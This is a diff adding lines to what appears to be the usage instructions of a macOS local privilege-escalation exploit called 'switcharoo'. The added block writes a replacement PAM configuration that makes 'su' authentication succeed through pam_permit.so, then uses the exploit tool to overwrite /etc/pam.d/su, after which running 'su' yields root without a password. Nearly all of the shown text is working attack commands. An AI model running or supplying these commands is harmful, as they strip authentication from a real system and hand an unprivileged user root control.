@@ -16,6 +16,21 @@ sed -i '' "s/wheel/staff/g" overwrite_file.bin
 su
 ```
 
+or even replace all 'required'
+
+```
+cat << EOF > overwrite_file.bin
+# su: auth account session
+auth       sufficient     pam_permit.so
+auth       optional       pam_opendirectory.so
+account    optional       pam_group.so no_warn group=admin,staff ruser root_only fail_safe
+account    optional       pam_opendirectory.so no_check_shell
+password   optional       pam_opendirectory.so
+session    optional       pam_launchd.so
+EOF
+./switcharoo /etc/pam.d/su overwrite_file.bin
+```
+
 You should get:
 
 ```
